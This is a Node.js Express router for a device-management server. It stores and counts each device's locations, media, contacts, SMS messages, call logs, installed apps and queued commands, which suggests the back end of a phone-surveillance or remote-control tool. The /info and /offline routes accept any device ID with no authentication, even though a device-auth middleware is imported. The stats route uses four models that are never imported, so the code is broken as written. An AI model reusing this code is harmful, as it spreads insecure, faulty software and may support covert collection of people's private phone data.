const express = require('express');
const { Op } = require('sequelize');
const { Device, DeviceInfo, Location, Command } = require('../config/database');
const { authenticateToken, requireAdmin, authenticateDevice } = require('../middleware/auth');
const logger = require('../utils/logger');

const router = express.Router();

router.use(express.json({ limit: '10mb' }));
router.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Utility to normalize device record
function normalizeDeviceRow(device) {
  if (!device) return null;
  // device may already be plain object or Sequelize instance
  const d = device.toJSON ? device.toJSON() : device;
  return {
    id: d.id,
    deviceId: d.device_id || d.deviceId,
    name: d.device_name || d.name || null,
    nickname: d.nickname || null,
    status: d.status || (d.last_seen && (new Date(d.last_seen) > new Date(Date.now() - 5 * 60 * 1000)) ? 'online' : 'offline'),
    lastSeen: d.last_seen || d.lastSeen || null,
    model: d.model || null,
    manufacturer: d.manufacturer || null,
    ipAddress: d.ip_address || d.ipAddress || null
  };
}

// GET /api/devices (paginated)
router.get('/', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 20, status, search } = req.query;
    const offset = (page - 1) * limit;
    const where = {};
    if (status) where.status = status;
    if (search) where[Op.or] = [
      { device_name: { [Op.like]: `%${search}%` } },
      { device_id: { [Op.like]: `%${search}%` } }
    ];

    const { count, rows } = await Device.findAndCountAll({
      where,
      limit: parseInt(limit),
      offset: parseInt(offset),
      order: [['last_seen', 'DESC']],
      include: [
        { model: DeviceInfo, as: 'deviceInfo', required: false }
      ]
    });

    // normalize
    const devices = (rows || []).map(normalizeDeviceRow);

    res.json({
      success: true,
      data: {
        devices,
        pagination: {
          current_page: parseInt(page, 10),
          total_pages: Math.ceil(count / limit),
          total_items: count
        }
      }
    });

  } catch (err) {
    logger.error('Error fetching devices:', err);
    res.status(500).json({ success: false, error: 'Server error', message: err.message });
  }
});

// GET single device
router.get('/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId, {
      include: [
        { model: DeviceInfo, as: 'deviceInfo' },
        { model: Location, as: 'locations', limit: 10, order: [['timestamp', 'DESC']] },
        { model: Command, as: 'commands', limit: 20, order: [['created_at', 'DESC']] }
      ]
    });
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    res.json({ success: true, data: { device: device.toJSON ? device.toJSON() : device } });
  } catch (err) {
    logger.error('Error fetching device:', err);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Update device
router.put('/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const allowed = ['device_name', 'is_active', 'notes', 'nickname', 'name'];
    const updates = {};
    Object.keys(req.body).forEach(k => { if (allowed.includes(k)) updates[k] = req.body[k]; });

    await device.update(updates);
    res.json({ success: true, data: { device: normalizeDeviceRow(device) } });
  } catch (err) {
    logger.error('Update device error:', err);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Update nickname
router.put('/:deviceId/nickname', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { nickname } = req.body;
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });
    await device.update({ nickname: nickname || null });
    res.json({ success: true, message: 'Device nickname updated', data: { device: normalizeDeviceRow(device) } });
  } catch (err) {
    logger.error('Nickname update error:', err);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Delete device
router.delete('/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });
    await device.destroy();
    logger.info(`Device deleted by admin: ${device.device_id || device.deviceId}`);

    res.json({ success: true, message: 'Device deleted successfully' });
  } catch (error) {
    logger.error('Delete device error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Device stats, info endpoints (kept original, but normalize outputs where appropriate)
router.get('/:deviceId/stats', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const [
      locationCount,
      mediaCount,
      contactCount,
      smsCount,
      callLogCount,
      commandCount
    ] = await Promise.all([
      Location.count({ where: { device_id: device.id } }),
      MediaFile.count({ where: { device_id: device.id } }),
      Contact.count({ where: { device_id: device.id } }),
      SMS.count({ where: { device_id: device.id } }),
      CallLog.count({ where: { device_id: device.id } }),
      Command.count({ where: { device_id: device.id } })
    ]);

    const recentActivity = await Location.findAll({ where: { device_id: device.id }, limit: 5, order: [['timestamp', 'DESC']] });

    res.json({
      success: true,
      data: {
        statistics: {
          locations: locationCount,
          media_files: mediaCount,
          contacts: contactCount,
          sms_messages: smsCount,
          call_logs: callLogCount,
          commands: commandCount
        },
        recent_activity: recentActivity
      }
    });
  } catch (error) {
    logger.error('Get device stats error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Device info update (from device)
router.post('/info', async (req, res) => {
  try {
    const deviceIdHeader = req.body.device_id || req.body.deviceId || req.headers['x-device-id'];
    const device = await Device.findOne({ where: { device_id: deviceIdHeader } });
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const {
      hardware_info,
      software_info,
      network_info,
      security_info,
      installed_apps,
      system_settings,
      permissions,
      sensors
    } = req.body;

    let deviceInfo = await DeviceInfo.findOne({ where: { device_id: device.id } });

    if (deviceInfo) {
      await deviceInfo.update({
        hardware_info, software_info, network_info, security_info,
        installed_apps, system_settings, permissions, sensors, last_updated: new Date()
      });
    } else {
      deviceInfo = await DeviceInfo.create({
        device_id: device.id, hardware_info, software_info, network_info, security_info,
        installed_apps, system_settings, permissions, sensors
      });
    }

    logger.info(`Device info updated: ${deviceIdHeader}`);

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    const emitted = { device_id: devicePlain.device_id || devicePlain.deviceId, deviceId: devicePlain.deviceId || devicePlain.device_id, info: deviceInfo.get ? deviceInfo.get({ plain: true }) : deviceInfo };

    if (req.io) {
      try { req.io.to('admin-room').emit('device-info-updated', emitted); } catch (emitErr) { logger.warn('Emit failed for device-info-updated', emitErr); }
    }

    res.json({ success: true, message: 'Device info updated successfully' });
  } catch (error) {
    logger.error('Update device info error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Set device offline (from device)
router.post('/offline', async (req, res) => {
  try {
    const deviceIdHeader = req.body.device_id || req.body.deviceId || req.headers['x-device-id'];
    const device = await Device.findOne({ where: { device_id: deviceIdHeader } });
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    await device.update({ status: 'offline', last_seen: new Date() });

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    const emitted = { device_id: devicePlain.device_id || devicePlain.deviceId, deviceId: devicePlain.deviceId || devicePlain.device_id, last_seen: devicePlain.last_seen || devicePlain.lastSeen || new Date() };

    if (req.io) {
      try { req.io.to('admin-room').emit('device-offline', emitted); } catch (emitErr) { logger.warn('Emit failed for device-offline', emitErr); }
    }

    res.json({ success: true, message: 'Device status updated to offline' });
  } catch (err) {
    logger.error('Set device offline error:', err);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

module.exports = router;
